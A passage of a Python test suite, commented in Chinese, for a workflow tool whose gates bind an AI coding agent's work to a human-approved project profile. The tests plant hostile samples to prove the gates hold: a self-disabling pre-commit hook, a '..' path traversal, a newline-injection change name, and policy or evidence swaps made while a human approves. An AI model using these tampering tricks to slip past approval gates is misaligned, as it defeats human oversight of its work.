            receipt=r/'.git/starter-enforcement-probe.json'
            self.assertTrue(receipt.exists(),'前提：誠實路徑會寫 receipt')
            h=r/'.myhooks/pre-commit'
            h.write_text('#!/bin/sh\n'
                         'bash .githooks/pre-commit\n'
                         'rc=$?\n'
                         'printf \'%s\\n\' \'#!/bin/sh\' \'exit 0\' > "$0.new"\n'
                         'chmod +x "$0.new"\n'
                         'mv -f "$0.new" "$0"\n'
                         'exit "$rc"\n',encoding='utf-8')
            h.chmod(0o755)
            x=self._run(r,'enforcement-status','--probe')
            self.assertNotEqual(x.returncode,0,x.stdout+x.stderr)
            self.assertFalse(receipt.exists(),'舊 receipt 必須被刪除，不能只是「這次沒寫」')
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_honest_chained_hook_still_records_a_receipt(self):
        """對照組。上面兩條若靠「一律不寫 receipt」通過，這條會紅。"""
        td,r=self._repo()
        try:
            self._chained(r,'#!/bin/sh\nbash .githooks/pre-commit\n')
            x=self._run(r,'enforcement-status','--probe')
            self.assertEqual(x.returncode,0,x.stdout+x.stderr)
            self.assertIn('ACTIVE_CHAINED',x.stdout,x.stdout)
            self.assertTrue((r/'.git/starter-enforcement-probe.json').exists())
        finally: shutil.rmtree(td,ignore_errors=True)

    # ---- Blocker 2：change identifier 的 canonical validation ------------------

    def test_start_change_rejects_path_traversal(self):
        """`..` 會讓路徑指向 openspec/，它非空，所以「目錄不得為空」的檢查通過。"""
        td,r=self._repo()
        try:
            (r/'openspec/changes').mkdir(parents=True,exist_ok=True)
            x=self._run(r,'start-change','..')
            out=x.stdout+x.stderr
            self.assertEqual(x.returncode,31,out)
            self.assertIn('路徑巡訪',out,out)
            self.assertIn('Active OpenSpec change: none',(r/'workflow/STATE.md').read_text(encoding='utf-8'),
                          'STATE 不得被污染')
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_start_change_rejects_path_separator(self):
        td,r=self._repo()
        try:
            d=r/'openspec/changes/real/sub'; d.mkdir(parents=True)
            (d/'proposal.md').write_text('x',encoding='utf-8')
            x=self._run(r,'start-change','real/sub')
            self.assertEqual(x.returncode,31,x.stdout+x.stderr)
            self.assertIn('路徑分隔符',x.stdout+x.stderr)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_start_change_rejects_newline_injection(self):
        """STATE.md 是逐行格式；換行會注入第二個 `Phase:`。"""
        td,r=self._repo()
        try:
            evil='evil\nPhase: ENGINEERING'
            d=r/'openspec/changes'/evil
            try: d.mkdir(parents=True)
            except OSError: d=None
            if d is not None: (d/'proposal.md').write_text('x',encoding='utf-8')
            x=self._run(r,'start-change',evil)
            out=x.stdout+x.stderr
            self.assertEqual(x.returncode,31,out)
            self.assertIn('控制字元',out,out)
            state=(r/'workflow/STATE.md').read_text(encoding='utf-8')
            self.assertEqual(len([l for l in state.splitlines() if l.startswith('Phase:')]),1,
                             'STATE 只能有一個 Phase 欄位\n'+state)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_legitimate_change_names_still_work(self):
        """對照組：validator 不得順手擋掉正常名字（含大寫與點）。"""
        td,r=self._repo()
        try:
            for name in ('add-auth','Add_Auth.v2','a'):
                d=r/'openspec/changes'/name; d.mkdir(parents=True)
                (d/'proposal.md').write_text('x',encoding='utf-8')
                x=self._run(r,'start-change',name)
                self.assertEqual(x.returncode,0,f'{name} 應該合法\n'+x.stdout+x.stderr)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_polluted_state_reports_a_readable_error_not_a_traceback(self):
        """fail-closed 不等於處理得當。Control Plane 壞掉不能長得像工具壞掉。"""
        td,r=self._repo()
        try:
            p=r/'workflow/STATE.md'
            p.write_text(p.read_text(encoding='utf-8').replace(
                'Active OpenSpec change: none','Active OpenSpec change: ..'),encoding='utf-8')
            x=self._run(r,'status')
            out=x.stdout+x.stderr
            self.assertEqual(x.returncode,42,out)
            self.assertNotIn('Traceback',out,'不得噴 stack trace\n'+out)
            self.assertIn('無法解析',out,out)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_verify_sh_rejects_traversal_change_and_writes_nothing_outside(self):
        """verify.sh 直接 grep STATE，繞過 parse_state，所以要共用同一個 validator。"""
        td,r=self._repo()
        try:
            self._resolve_profile(r)
            self._set_profile(r,Core_verification_policy='not-applicable',
                              Verification_exception_reason='純模板 repo')
            p=r/'workflow/STATE.md'
            p.write_text(p.read_text(encoding='utf-8').replace(
                'Active OpenSpec change: none','Active OpenSpec change: ..'),encoding='utf-8')
            x=subprocess.run(['bash','workflow/bin/verify.sh','--full'],
                             cwd=r,capture_output=True,text=True)
            out=x.stdout+x.stderr
            self.assertNotEqual(x.returncode,0,out)
            self.assertIn('不合法',out,out)
            self.assertFalse((r/'workflow/core').exists(),
                             'evidence 不得被寫到 workflow/ 底下（越出宣告的 ownership）')
        finally: shutil.rmtree(td,ignore_errors=True)

    # ---- Blocker 3：profile 的 schema、涵蓋範圍與批准綁定 ----------------------

    def test_typo_in_type_is_rejected_not_treated_as_resolved(self):
        """`WEB_AP` 原本會被當成已解析，而 Browser Gate 因此判為 NON_WEB。"""
        td,r=self._repo()
        try:
            self._resolve_profile(r); self._set_profile(r,Type='WEB_AP')
            sys.path.insert(0,str(r/'workflow/bin'))
            try:
                import importlib, workflow_state as W
                importlib.reload(W)
                un,inv,res,dg=W.profile_resolution(r)
                self.assertEqual(un,[],'不是「未填」，是「填錯」')
                self.assertTrue(any(n=='Type' for n,_,_ in inv),f'必須列為 invalid：{inv}')
                self.assertIsNone(dg,'有 invalid 就不得產生 digest')
                self.assertEqual(W.project_web_status(r),'UNRESOLVED',
                                 '決定 Gate 開關的那一層也要 fail-closed，'
                                 '不能靠「不等於 WEB_APP」推論它是非 Web')
            finally: sys.path.remove(str(r/'workflow/bin'))
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_testdb_strategy_enum_and_other_escape_hatch(self):
        td,r=self._repo()
        try:
            self._resolve_profile(r)
            sys.path.insert(0,str(r/'workflow/bin'))
            try:
                import importlib, workflow_state as W
                importlib.reload(W)
                for good in W.TESTDB_STRATEGIES:
                    self._set_profile(r,Test_database_strategy=good)
                    _,inv,_,dg=W.profile_resolution(r)
                    self.assertEqual(inv,[],f'{good} 應該合法')
                    self.assertIsNotNone(dg)
                self._set_profile(r,Test_database_strategy='之後再決定')
                _,inv,_,dg=W.profile_resolution(r)
                self.assertTrue(inv,'自由文字必須被擋 —— 它跟 UNKNOWN 一樣未決')
                self.assertIsNone(dg)
                self._set_profile(r,Test_database_strategy='other:')
                _,inv,_,_=W.profile_resolution(r)
                self.assertTrue(inv,'單獨的 `other:` 是 UNKNOWN 換皮')
                self._set_profile(r,Test_database_strategy='other: Firestore emulator')
                _,inv,_,dg=W.profile_resolution(r)
                self.assertEqual(inv,[],'逃生口必須真的能用')
                self.assertIsNotNone(dg)
            finally: sys.path.remove(str(r/'workflow/bin'))
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_free_text_fields_stay_free_text(self):
        """對照組：沒有正式 vocabulary 的欄位不得被順手加上約束。"""
        td,r=self._repo()
        try:
            self._resolve_profile(r)
            self._set_profile(r,Primary_stack='某個沒人聽過的框架',
                              Package_manager='自製工具',CI_provider='內部系統')
            sys.path.insert(0,str(r/'workflow/bin'))
            try:
                import importlib, workflow_state as W
                importlib.reload(W)
                _,inv,_,dg=W.profile_resolution(r)
                self.assertEqual(inv,[],f'自由文字欄位不該被擋：{inv}')
                self.assertIsNotNone(dg)
            finally: sys.path.remove(str(r/'workflow/bin'))
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_verification_waiver_changes_the_approved_digest(self):
        """waiver 必須在人類批准的內容裡面，否則等於批准了一份看不見的政策。"""
        td,r=self._repo()
        try:
            self._resolve_profile(r)
            sys.path.insert(0,str(r/'workflow/bin'))
            try:
                import importlib, workflow_state as W
                importlib.reload(W)
                _,_,res_a,dg_a=W.profile_resolution(r)
                self.assertIn('Core verification policy',res_a,
                              'TTY 畫面用 resolved 產生；不在裡面就等於沒顯示')
                self._set_profile(r,Core_verification_policy='not-applicable',
                                  Verification_exception_reason='skip automated checks')
                _,_,res_b,dg_b=W.profile_resolution(r)
                self.assertNotEqual(dg_a,dg_b,'豁免 automated verification 必須改變 digest')
                self.assertEqual(res_b['Verification exception reason'],'skip automated checks')
            finally: sys.path.remove(str(r/'workflow/bin'))
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_start_engineering_rejects_profile_changed_after_approval(self):
        """批准綁的是內容不是旗標。approve-spec 與 start-engineering 之間可以隔任意久。"""
        td,r=self._repo()
        try:
            self._resolve_profile(r)
            d=r/'openspec/changes/demo'; d.mkdir(parents=True)
            (d/'proposal.md').write_text('x',encoding='utf-8')
            # STATE 宣稱 test design 已批准，artifact 就必須存在。
            tc=r/'workflow/test-cases'; tc.mkdir(parents=True,exist_ok=True)
            (tc/'demo.md').write_text('# Test Design\n- [ ] 案例\n',encoding='utf-8')
            # 且必須進 HEAD：宣稱已批准而 fresh clone 拿不到，就是不忠實的 fixture。
            recommit(r,'fixture: approved artifacts')
            sys.path.insert(0,str(r/'workflow/bin'))
            try:
                import importlib, workflow_state as W
                importlib.reload(W)
                _,_,_,dg=W.profile_resolution(r)
                W.write_state(r/'workflow/STATE.md',
                              W.WorkflowState('TEST_DESIGN','GREENFIELD','demo','yes','yes','no',
                                              'human',W.now_iso(),dg,
                                              W.spec_digest(r,'demo') or 'none',
                                              W.test_design_digest(r,'demo') or 'none'))
                ok=self._run(r,'start-engineering','demo')
                self.assertEqual(ok.returncode,0,'前提：未改動時應該通過\n'+ok.stdout+ok.stderr)
                s=W.parse_state(r/'workflow/STATE.md')
                W.write_state(r/'workflow/STATE.md',dataclasses_replace(s,phase='TEST_DESIGN'))
                # 掉包並 commit：三來源一致，鎖的是 digest 層。只改 worktree 的形狀
                # 由 RC5Round13Tests 的綁定層測試鎖住。
                self._set_profile(r,Core_verification_policy='not-applicable',
                                  Verification_exception_reason='skip')
                recommit(r,'swap policy')
                x=self._run(r,'start-engineering','demo')
                out=x.stdout+x.stderr
                self.assertEqual(x.returncode,44,out)
                self.assertIn('人類批准的內容不一致',out,out)
            finally: sys.path.remove(str(r/'workflow/bin'))
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_start_engineering_fails_closed_on_state_without_digest_field(self):
        """舊 schema 的 STATE 無法證明 profile 被批准過 —— 必須要求重新 approve-spec。"""
        td,r=self._repo()
        try:
            self._resolve_profile(r)
            d=r/'openspec/changes/demo'; d.mkdir(parents=True)
            (d/'proposal.md').write_text('x',encoding='utf-8')
            sys.path.insert(0,str(r/'workflow/bin'))
            try:
                import importlib, workflow_state as W
                importlib.reload(W)
                W.write_state(r/'workflow/STATE.md',
                              W.WorkflowState('TEST_DESIGN','GREENFIELD','demo','yes','yes','no',
                                              'human',W.now_iso(),'none',
                                              W.spec_digest(r,'demo') or 'none',
                                              W.test_design_digest(r,'demo') or 'none'))
                p=r/'workflow/STATE.md'
                p.write_text(re.sub(r'^Approved profile digest:.*\n','',
                                    p.read_text(encoding='utf-8'),flags=re.M),encoding='utf-8')
                x=self._run(r,'start-engineering','demo')
                out=x.stdout+x.stderr
                self.assertEqual(x.returncode,44,out)
                self.assertIn('重新執行 approve-spec',out,out)
            finally: sys.path.remove(str(r/'workflow/bin'))
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_approve_spec_lists_invalid_separately_from_unresolved(self):
        """「填錯」與「沒填」給同一句話，使用者會以為自己沒存檔而重打同樣的錯字。"""
        td,r=self._repo()
        try:
            self._resolve_profile(r); self._set_profile(r,Monorepo='maybe')
            subprocess.run(['python3','workflow/bin/workflow_transition.py','set-mode','GREENFIELD'],
                           cwd=r,check=True,capture_output=True)
            d=r/'openspec/changes/demo'; (d/'specs').mkdir(parents=True)
            (d/'proposal.md').write_text('x',encoding='utf-8')
            (d/'tasks.md').write_text('x',encoding='utf-8')
            (d/'specs/main.md').write_text('x',encoding='utf-8')
            for c in (['start-change','demo'],['submit-for-review','demo']):
                subprocess.run(['python3','workflow/bin/workflow_transition.py']+c,
                               cwd=r,check=True,capture_output=True)
            x=self._run(r,'approve-spec','demo')
            out=x.stdout+x.stderr
            self.assertEqual(x.returncode,44,out)
            self.assertIn('無法辨識的值',out,out)
            self.assertIn('maybe',out,'必須把實際填的值回顯出來')
            self.assertNotIn('TTY',out,'必須在 TTY 檢查之前就拒絕')
        finally: shutil.rmtree(td,ignore_errors=True)


    # ---- Blocker 3c：TTY 等待期間的重新綁定（必須用真 pty 才測得到） ----------

    def _spec_review_repo(self):
        """停在 SPEC_REVIEW、profile 已解析的 repo。"""
        td,r=self._repo()
        st=r/'workflow/STATE.md'
        st.write_text(st.read_text(encoding='utf-8')
                      .replace('Phase: DISCOVERY','Phase: SPEC_REVIEW')
                      .replace('Active OpenSpec change: none','Active OpenSpec change: demo'),
                      encoding='utf-8')
        c=r/'openspec/changes/demo'; c.mkdir(parents=True,exist_ok=True)
        for n in ('proposal.md','spec.md','tasks.md'): (c/n).write_text(n,encoding='utf-8')
        self._resolve_profile(r)
        return td,r

    def _approve_on_pty(self, repo, mutate=None, timeout=25):
        """在 pty 上執行 approve-spec。`mutate` 會在**提示出現之後、送出確認字串之前**
        被呼叫 —— 那正是真實攻擊的視窗：人類正在讀畫面，另一個 process 換掉檔案。
        """
        import pty, os, select, time
        pid, fd = pty.fork()
        if pid == 0:
            os.chdir(str(repo))
            os.execvp('python3',['python3','workflow/bin/workflow_transition.py','approve-spec','demo'])
            os._exit(127)
        out=b''; step=0
        # 兩個提示：先問 change 名稱，再問 approval actor（簽名）。
        # 只送一行會讓子行程停在第二個提示，測試因此掛住而不是失敗。
        try:
            deadline=time.time()+timeout
            while time.time()<deadline:
                rl,_,_=select.select([fd],[],[],0.5)
                if rl:
                    try: chunk=os.read(fd,4096)
                    except OSError: break
                    if not chunk: break
                    out+=chunk
                seen=out.decode(errors='replace')
                if step==0 and '以確認' in seen:
                    # mutate 必須在這裡：人類正在讀畫面，尚未完成確認。
                    if mutate is not None: mutate()
                    os.write(fd,b'demo\n'); step=1
                elif step==1 and 'Approval actor' in seen:
                    os.write(fd,b'tester\n'); step=2
            _,status=os.waitpid(pid,0)
            code=os.waitstatus_to_exitcode(status)
        finally:
            try: os.close(fd)
            except OSError: pass
        return code, out.decode(errors='replace')

    def test_profile_edited_during_tty_wait_invalidates_the_approval(self):
        """TTY 是人類速度的等待，視窗以分鐘計。人類批准的是畫面上那份，不是他打完字時磁碟上那份。"""
        td,r=self._spec_review_repo()
        try:
            def mutate():
                self._set_profile(r,Core_verification_policy='not-applicable',
                                  Verification_exception_reason='skip automated checks')
            code,out=self._approve_on_pty(r,mutate=mutate)
            self.assertEqual(code,44,out)
            self.assertIn('在你確認期間被修改',out,out)
            self.assertIn('Phase: SPEC_REVIEW',(r/'workflow/STATE.md').read_text(encoding='utf-8'),
                          '作廢的批准不得改動 STATE')
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_unmodified_profile_still_approves_on_pty(self):
        """對照組。上面那條若靠「approve-spec 一律失敗」通過，這條會紅。"""
        td,r=self._spec_review_repo()
        try:
            code,out=self._approve_on_pty(r)
            self.assertEqual(code,0,out)
            state=(r/'workflow/STATE.md').read_text(encoding='utf-8')
            self.assertIn('Phase: TEST_DESIGN',state,state)
            self.assertNotIn('Approved profile digest: none',state,
                             '批准必須把 digest 寫進 STATE，否則 start-engineering 無從回驗')
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_tty_prompt_lists_the_verification_policy_being_approved(self):
        """畫面上看不到的東西不算被批准過。"""
        td,r=self._spec_review_repo()
        try:
            self._set_profile(r,Core_verification_policy='not-applicable',
                              Verification_exception_reason='skip automated checks')
            # 這是批准**之前**的合法設定，不是掉包：要進 HEAD 才能被批准。
            recommit(r,'fixture: policy before approval')
            code,out=self._approve_on_pty(r)
            self.assertEqual(code,0,out)
            self.assertIn('Core verification policy: not-applicable',out,
                          'verification waiver 必須列在人類看得到的確認畫面上\n'+out)
            self.assertIn('skip automated checks',out,out)
        finally: shutil.rmtree(td,ignore_errors=True)



class RC5Round13Tests(unittest.TestCase):
    """Codex 第十三輪：把 profile digest 從「一次性關卡」改成「持續不變式」。

    共同判準：`Approved profile digest: none` 的語意是**可解析，但不具備任何
    批准後權限**，而不是「下次 start-engineering 會擋」。
    """

    def _repo(self):
        td=Path(tempfile.mkdtemp(prefix='rc5r13-')); r=td/'repo'; r.mkdir()
        for rel in OWNED:
            src=SRC/rel
            if not src.exists(): continue
            dst=r/rel
            if src.is_dir():
                shutil.copytree(src,dst,dirs_exist_ok=True,ignore=shutil.ignore_patterns('__pycache__','*.pyc','node_modules','dist','build','.next','venv','.venv','coverage','playwright-report','test-results'))
            else:
                dst.parent.mkdir(parents=True,exist_ok=True); shutil.copy2(src,dst)
        (r/'.githooks/pre-commit').chmod(0o755)
        for c in (['git','init','-b','main'],['git','config','user.email','a@example.invalid'],
                  ['git','config','user.name','A']):
            subprocess.run(c,cwd=r,check=True,capture_output=True)
        return td,r

    def _run(self,r,*args):
        return subprocess.run(['python3','workflow/bin/workflow_transition.py',*args],
                              cwd=r,capture_output=True,text=True)

    def _set_profile(self,r,**kv):
        p=r/'PROJECT-PROFILE.md'; t=p.read_text(encoding='utf-8')
        for k,v in kv.items():
            k=k.replace('_',' ')
            t=re.sub(rf'^{re.escape(k)}:[ \t]*.*$',f'{k}: {v}',t,count=1,flags=re.M)
        p.write_text(t,encoding='utf-8')

    def _approved_engineering(self,r):
        """做出一個「已批准 policy=auto、已在 ENGINEERING」的合法狀態。"""
        self._set_profile(r,Type='API',Web_verification_required='no',
                          Primary_stack='Python 3.12',Package_manager='uv',Monorepo='no',
                          CI_provider='GitHub Actions',Test_database_strategy='not-applicable')
        (r/'openspec/changes/demo').mkdir(parents=True,exist_ok=True)
        (r/'openspec/changes/demo/proposal.md').write_text('x',encoding='utf-8')
        (r/'workflow/test-cases').mkdir(parents=True,exist_ok=True)
        (r/'workflow/test-cases/demo.md').write_text('cases',encoding='utf-8')
        (r/'package.json').write_text(json.dumps({"scripts":{"test":"echo ok","build":"echo build"}}),
                                      encoding='utf-8')
        sys.path.insert(0,str(r/'workflow/bin'))
        try:
            import workflow_state as W
            importlib.reload(W)
            _,_,_,dg=W.profile_resolution(r)
            self.assertIsNotNone(dg,'前提：profile 必須完全解析')
            W.write_state(r/'workflow/STATE.md',
                          W.WorkflowState('ENGINEERING','GREENFIELD','demo','yes','yes','no',
                                          'human',W.now_iso(),dg,
                                          W.spec_digest(r,'demo') or 'none',
                                          W.test_design_digest(r,'demo') or 'none'))
        finally: sys.path.remove(str(r/'workflow/bin'))
        subprocess.run(['git','add','-A'],cwd=r,check=True,capture_output=True)
        subprocess.run(['git','-c','core.hooksPath=/dev/null','commit','-m','approved'],
                       cwd=r,check=True,capture_output=True)
        return dg

    # ---- Blocker 1：`none` 是保留哨兵 ----------------------------------------

    def test_none_is_rejected_as_change_id(self):
        """`none` 同時是 `Active OpenSpec change` 的哨兵。允許它會產生自相矛盾的狀態：
        transition 成功、state-log 追加一筆，但讀取語意認為沒有 active change。
        """
        td,r=self._repo()
        try:
            for name in ('none','None','NONE'):
                d=r/'openspec/changes'/name
                if not d.exists(): d.mkdir(parents=True)
                (d/'proposal.md').write_text('x',encoding='utf-8')
                x=self._run(r,'start-change',name)
                out=x.stdout+x.stderr
                self.assertEqual(x.returncode,31,f'{name} 必須被拒絕\n'+out)
                self.assertIn('保留字',out,out)
            state=(r/'workflow/STATE.md').read_text(encoding='utf-8')
            self.assertIn('Phase: DISCOVERY',state,'STATE 不得被改動')
            log=(r/'workflow/state-log.md').read_text(encoding='utf-8')
            self.assertNotIn('- Action: start-change',log,'append-only log 不得被污染')
        finally: shutil.rmtree(td,ignore_errors=True)

    # ---- Blocker 2：digest 必須是持續不變式，不是一次性關卡 --------------------

    def test_old_engineering_state_without_digest_blocks_product_commits(self):
        """已在 ENGINEERING 的舊 STATE 永遠不會再碰到 start-engineering 的拒絕。

        `implementation_allowed` 只看 phase 與兩個 flag，所以 pre-commit gate
        原本會放行產品程式碼。
        """
        td,r=self._repo()
        try:
            # 必須先有 HEAD。gate 對 initial commit 會刻意放行一次，
            # 沒有 base commit 的話這條測試會因為完全無關的理由通過。
            subprocess.run(['git','add','-A'],cwd=r,check=True,capture_output=True)
            subprocess.run(['git','-c','core.hooksPath=/dev/null','commit','-m','base'],
                           cwd=r,check=True,capture_output=True)
            p=r/'workflow/STATE.md'; t=p.read_text(encoding='utf-8')
            t=(t.replace('Phase: DISCOVERY','Phase: ENGINEERING')
                 .replace('Spec approved: no','Spec approved: yes')
                 .replace('Test design approved: no','Test design approved: yes')
                 .replace('Active OpenSpec change: none','Active OpenSpec change: demo'))
            p.write_text(re.sub(r'^Approved profile digest:.*\n','',t,flags=re.M),encoding='utf-8')
            sys.path.insert(0,str(r/'workflow/bin'))
            try:
                import workflow_state as W
                importlib.reload(W)
                s=W.parse_state(p)
                self.assertTrue(s.implementation_allowed,
                                '前提：STATE 內部推導仍然是 allowed —— 這正是問題所在')
                ok,_=W.implementation_authorized(r,s)
                self.assertFalse(ok,'授權必須同時看 profile binding')
            finally: sys.path.remove(str(r/'workflow/bin'))
            (r/'src').mkdir(exist_ok=True)
            (r/'src/app.py').write_text('print(1)\n',encoding='utf-8')
            subprocess.run(['git','add','src/app.py'],cwd=r,check=True,capture_output=True)
            x=subprocess.run(['python3','workflow/bin/check-implementation-gate.py','--staged'],
                             cwd=r,capture_output=True,text=True)
            out=x.stdout+x.stderr
            self.assertNotEqual(x.returncode,0,'產品 commit 必須被擋\n'+out)
            self.assertIn('DENY',out,out)
            self.assertIn('src/app.py',out,'必須列出被擋的檔案')
            # 訊息本身就是這個分支的價值。安全性上它是冗餘的 —— digest 為 none 時
            # 後面的比對也會擋（真 digest 永遠不等於字串 'none'）。但舊 schema 的
            # 使用者需要知道「去重跑 approve-spec」，而不是收到一則寫著
            # 「批准時 digest: none」的比對失敗訊息。突變測試證實：拿掉這個分支
            # 而只留比對，六條測試全部照樣綠 —— 所以要鎖的是訊息，不是擋不擋。
            self.assertIn('重新執行 approve-spec',out,
                          '舊 schema 必須拿到可操作的指示，不是一則 digest 比對失敗\n'+out)
            self.assertNotIn('批准時 digest: none',out,
                             '不得把哨兵值當成一個「曾經批准過的 digest」來顯示\n'+out)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_worktree_only_policy_swap_cannot_produce_accepted_evidence(self):
        """最嚴重的一個：只在 worktree 換掉 policy，不 stage，事後 restore。

        Git gate 看不到任何 profile mutation，但 evidence 是依從未被批准的
        not-applicable 產生的（Checks executed: 0）。
        """
        td,r=self._repo()
        try:
            self._approved_engineering(r)
            self._set_profile(r,Core_verification_policy='not-applicable',
                              Verification_exception_reason='temporarily skip')
            x=self._run(r,'verification-pass','demo')
            out=x.stdout+x.stderr
            self.assertEqual(x.returncode,44,out)
            # 掉包只發生在 worktree，所以先被三來源綁定層擋下（它的訊息更精確地
            # 說出了發生什麼事）。digest 層的訊息由 test_committed_swap_is_caught_by_digest
            # 鎖住 —— 兩層都要有測試，否則其中一層可被刪除而測試全綠。
            self.assertIn('worktree / index / HEAD 三者內容不一致',out,out)
            self.assertFalse((r/'workflow/evidence/demo/core').exists(),
                             '連 evidence 都不該被產生 —— 檢查必須在跑 verify.sh 之前')
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_committed_swap_is_caught_by_digest(self):
        """**綁定層的姊妹測試。** 掉包後 commit，三來源一致 —— 綁定層無話可說，
        必須由 digest 比對擋下。少了這一條，digest 那層可以被整個刪掉而測試全綠。"""
        td,r=self._repo()
        try:
            self._approved_engineering(r)
            self._set_profile(r,Core_verification_policy='not-applicable',
                              Verification_exception_reason='temporarily skip')
            recommit(r,'swap policy and commit')
            x=self._run(r,'verification-pass','demo')
            out=x.stdout+x.stderr
            self.assertEqual(x.returncode,44,out)
            self.assertIn('與人類批准的內容不一致',out,out)
            self.assertNotIn('三者內容不一致',out,
                             '三來源已一致，不該再宣稱分裂\n'+out)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_archive_also_rebinds(self):
        """archive 是最後一道；它同樣不能只看 flag。"""
        td,r=self._repo()
        try:
            self._approved_engineering(r)
            ok=self._run(r,'verification-pass','demo')
            self.assertEqual(ok.returncode,0,'前提：誠實路徑通過\n'+ok.stdout+ok.stderr)
            # commit 掉包內容：三來源一致，鎖的是 digest 層而非綁定層。
            self._set_profile(r,Core_verification_policy='not-applicable',
                              Verification_exception_reason='temporarily skip')
            recommit(r,'swap policy')
            x=self._run(r,'archive','demo')
            out=x.stdout+x.stderr
            self.assertEqual(x.returncode,44,out)
            self.assertIn('與人類批准的內容不一致',out,out)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_evidence_records_and_is_validated_against_approved_digest(self):
        """evidence 必須自證來歷：產生它的 profile 可以事後被 restore。"""
        td,r=self._repo()
        try:
            dg=self._approved_engineering(r)
            x=self._run(r,'verification-pass','demo')
            self.assertEqual(x.returncode,0,x.stdout+x.stderr)
            ev=sorted((r/'workflow/evidence/demo/core').glob('*.md'))[-1]
            text=ev.read_text(encoding='utf-8')
            self.assertIn(f'Approved profile digest: {dg}',text,
                          'evidence 必須記錄它依哪一份被批准的 profile 產生\n'+text)
            # 竄改 evidence 的 digest → validator 必須拒絕
            ev.write_text(text.replace(f'Approved profile digest: {dg}',
                                       'Approved profile digest: '+('0'*64)),encoding='utf-8')
            sys.path.insert(0,str(r/'workflow/bin'))
            try:
                import workflow_transition as T
                importlib.reload(T)
            finally: sys.path.remove(str(r/'workflow/bin'))
            y=self._run(r,'archive','demo')
            self.assertNotEqual(y.returncode,0,'digest 對不上的 evidence 不得被接受\n'+y.stdout+y.stderr)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_provenance_layer_in_isolation(self):
        """**隔離測試**：只讓來歷這一層生效。

        原本我以為「竄改 evidence 的 digest 後 archive 會拒絕」測到了這一層 ——
        並沒有。archive 會先比對 state-log 記錄的 SHA-256，竄改檔案在那裡就被擋下，
        來歷檢查根本沒跑到。突變測試證實：把 `_core_evidence_provenance` 整個拿掉，
        或把 digest 比對改成永遠通過，那條測試照樣是綠的。

        所以這裡直接呼叫 validator，不經過任何會更早開火的層。
        """
        td,r=self._repo()
        try:
            dg=self._approved_engineering(r)
            ev=r/'ev.md'
            base=('# x\nCore evidence schema: 2\nVerification policy: auto\n'
                  'Checks selected: 1\nChecks executed: 1\nExit code: 0\n'
                  'Outcome: PASS\nOverall exit code: 0\n')
            sys.path.insert(0,str(r/'workflow/bin'))
            try:
                import importlib.util as _iu
                spec=_iu.spec_from_file_location('wt_prov',r/'workflow/bin/workflow_transition.py')
                m=_iu.module_from_spec(spec); sys.modules['wt_prov']=m; spec.loader.exec_module(m)

                def check(digest_line):
                    ev.write_text(base.replace('Core evidence schema: 2\n',
                                               'Core evidence schema: 2\n'+digest_line,1),
                                  encoding='utf-8')
                    return m.core_evidence_status(ev)

                ok,why=check('')
                self.assertFalse(ok,'缺欄位必須被拒')
                self.assertIn('沒有 Approved profile digest 欄位',why,why)

                ok,why=check('Approved profile digest: none\n')
                self.assertFalse(ok,'哨兵值不是一個「批准過的 digest」')
                self.assertIn('沒有批准過的 profile digest',why,why)

                ok,why=check('Approved profile digest: '+('a'*64)+'\n')
                self.assertFalse(ok,'digest 對不上必須被拒')
                self.assertIn('與 STATE 的',why,why)

                ok,why=check(f'Approved profile digest: {dg}\n')
                self.assertTrue(ok,f'對得上的 evidence 必須被接受：{why}')
            finally:
                sys.path.remove(str(r/'workflow/bin'))
                sys.modules.pop('wt_prov',None)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_claude_write_guard_uses_the_same_predicate(self):
        """即時回饋層必須與 pre-commit gate 同一條判準。

        `.claude/**` 不是 enforcement（見 GATES.md），但回饋錯了比沒有回饋更糟 ——
        guard 說「可以寫」、pre-commit 說「不能 commit」，agent 會白做一整輪工。
        """
        td,r=self._repo()
        try:
            self._approved_engineering(r)
            payload=json.dumps({'tool_input':{'file_path':str(r/'src/app.py')}})
            def run_guard():
                return subprocess.run(['python3','.claude/hooks/guard-workflow-gate.py'],
                                      cwd=r,input=payload,capture_output=True,text=True)
            x=run_guard()
            self.assertNotIn('"permissionDecision": "deny"',x.stdout,
                             '前提：批准狀態一致時應該放行\n'+x.stdout+x.stderr)
            # profile 被換成人類沒批准過的內容 → 必須跟著拒絕。
            # 這裡刻意 **commit** 掉包內容：三來源一致，因此被 digest 層擋，
            # 鎖的是 digest 層的訊息。只在 worktree 掉包的形狀由
            # test_worktree_only_swap_is_caught_by_the_binding_layer 鎖住。
            self._set_profile(r,Core_verification_policy='not-applicable',
                              Verification_exception_reason='temporarily skip')
            recommit(r,'swap policy')
            y=run_guard()
            self.assertIn('deny',y.stdout,'profile 已被換掉，guard 必須拒絕\n'+y.stdout+y.stderr)
            self.assertIn('與人類批准的內容不一致',y.stdout,y.stdout)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_browser_evidence_is_pinned_like_core_evidence(self):
        """browser.md 是 **AI-writable**，卻是 archive 的前提之一。

        只靠 archive 重跑 validate_browser 不夠 —— 那只證明「現在這份也合法」，
        不證明「這份就是 verification-pass 當時驗收的那一份」。
        """
        td,r=self._repo()
        try:
            self._approved_engineering(r)
            v=self._run(r,'verification-pass','demo')
            self.assertEqual(v.returncode,0,v.stdout+v.stderr)
            log=(r/'workflow/state-log.md').read_text(encoding='utf-8')
            self.assertIn('- Browser evidence sha256: ',log,
                          'verification-pass 必須把 browser evidence 一併釘住\n'+log[-600:])
            bf=r/'workflow/evidence/demo/browser.md'
            # 換成另一份「內容仍然合法」的 browser.md —— 這正是 AI 做得到的事
